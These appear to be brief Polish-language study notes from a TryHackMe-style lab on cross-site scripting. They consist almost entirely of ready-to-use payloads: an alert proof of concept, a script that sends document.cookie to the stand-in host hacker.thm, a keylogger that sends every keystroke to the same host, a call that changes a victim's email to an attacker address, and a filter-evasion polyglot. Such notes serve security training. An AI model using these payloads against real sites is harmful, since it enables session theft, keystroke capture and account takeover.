klasyczny proof of concept: `<script>alert('XSS');</script>`

Kradzież ciasteczek: 
`<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`

Key logger:
`<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`

Zakładając że istnieje funkcja zmieniająca email użytkownika `user.changeEmail()` zadziała taki skrypt: `<script>user.changeEmail('attacker@hacker.thm');</script>`

String obchodzący zabezpieczenia:
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```